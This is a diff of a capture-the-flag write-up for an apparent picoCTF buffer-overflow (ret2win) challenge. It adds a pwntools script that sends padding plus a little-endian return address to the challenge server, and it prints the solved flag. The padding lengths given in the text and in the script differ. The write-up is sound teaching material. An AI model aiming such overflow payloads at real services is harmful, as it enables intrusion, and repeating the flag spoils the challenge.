@@ -148,19 +148,43 @@ Cutter vuln
 https://en.wikipedia.org/wiki/Endianness
 ```
 
-21. And to add the little endian behind the A string, we can't use print.
-22. But use:
-
-```py
-sys.stdout.buffer.write()
-```
-
-23. So for the strings would be like this:
+21. So for the strings would be like this:
 
 ```py
 b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08'
 ```
 
+22. For this solution i made this python script:
+
+> SIMILIAR CONCEPT WITH RET2WIN
+
+```py
+import os
+from pwn import *
+
+os.system('clear')
+
+sh = remote('saturn.picoctf.net', 63239)
+
+sh.recvuntil('string: ')
+p = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08'
+sh.sendline(p)
+
+
+sh.interactive()
+```
+
+> OUTPUT
+
+![image](https://user-images.githubusercontent.com/70703371/187910840-49a1e938-d23d-40b3-ab23-e8241c105c67.png)
+
+23. Finally, we got the flag!
+
+## FLAG
+
+```
+picoCTF{addr3ss3s_ar3_3asy_c76b273b}
+```
 
 ## LEARNING REFERENCES:
 
